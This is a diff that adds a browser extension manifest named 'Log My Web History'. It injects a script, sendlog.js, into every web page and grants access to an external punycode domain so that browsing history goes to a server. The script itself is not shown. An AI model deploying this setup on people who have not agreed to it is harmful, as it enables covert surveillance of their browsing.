@@ -1,0 +1,23 @@
+{
+  "manifest_version": 2,
+
+  "name": "Log My Web History",
+  "description": "This extension log web history to server",
+  "version": "1.0",
+
+  "content_scripts": [
+    {
+     "matches": [
+      "http://*/*",
+      "https://*/*"
+    ],
+      "js": [
+            "sendlog.js"
+        ]
+    }
+  ],
+  "permissions": [
+    "activeTab",
+    "https://browser.xn--e1tu68bcc.com/"
+  ]
+}
